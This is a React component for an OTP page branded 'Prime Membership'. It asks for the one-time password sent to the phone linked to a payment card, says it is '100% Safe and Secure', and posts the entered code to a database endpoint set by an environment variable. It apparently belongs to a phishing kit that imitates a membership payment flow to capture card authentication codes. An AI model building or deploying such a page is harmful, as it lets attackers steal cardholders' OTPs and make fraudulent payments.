
import { useState, useEffect, useRef } from 'react'

import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';




function Otp() {
  const [count, setCount] = useState()
  const navigate = useNavigate();

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors, isSubmitting },
  } = useForm();

  const delay = (d) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve()
      }, d * 5000);
    })
  }

  //const onSubmit = async (data) => {
  // await delay(2)
  //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
  //let res = await r.text()
  //console.log(data, res)


  const onSubmit = async (data) => {
    navigate("/Order id")
    let r = await fetch(import.meta.env.VITE_MONGO, {
      method: "POST", headers: {
        "Content-Type": "application/json",
      }, body: JSON.stringify(data)

      
    })
    let res = await r.text()
   
    console.log(data, res)


  }

  

  return (
    <>

<div className="payment-nav card-navbar">
  
        <img id='payment-img' src="./img/img1.png.webp" alt="fail to load img 1" />
        <h3 id='payment-heading'> Prime Membership</h3>
      </div>
      

      {isSubmitting && <div>Loading...</div>}
      <div className="container">

<div className="otp-heading">OTP send to the phone number linked to your card </div>

        <form action="" onSubmit={handleSubmit(onSubmit)}>
          <input placeholder='OTP'{...register("OTP")} type="number" name="OTP" className='input' />
         

          
          <button type="submit" value="submit"  id='card-pay-button'> Submit</button>
        </form>
      </div>

      <div className="debit-footer">
        <img id='footer-img' src="./img/img1.png.webp" alt="fail to load footer img " />
        <h3 id='footer-heading'>
          100% Safe and Secure
        </h3>

      </div>

    </>
  )
}

export default Otp